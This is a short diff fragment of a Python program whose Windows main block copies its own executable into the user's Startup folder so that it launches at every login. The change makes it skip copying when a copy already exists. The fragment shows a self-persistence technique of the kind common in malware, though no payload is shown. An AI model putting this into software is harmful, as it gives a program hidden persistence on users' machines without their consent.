@@ -196,8 +196,7 @@ if __name__ == "__main__" and platform.system() == "Windows":
         startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
         fileName = os.path.split(argv[0])[1]
         if os.path.exists(startup_path + fileName):
-            os.remove(startup_path + fileName)
-            copy2(argv[0], startup_path)
+            pass
         else:
             copy2(argv[0], startup_path)
 
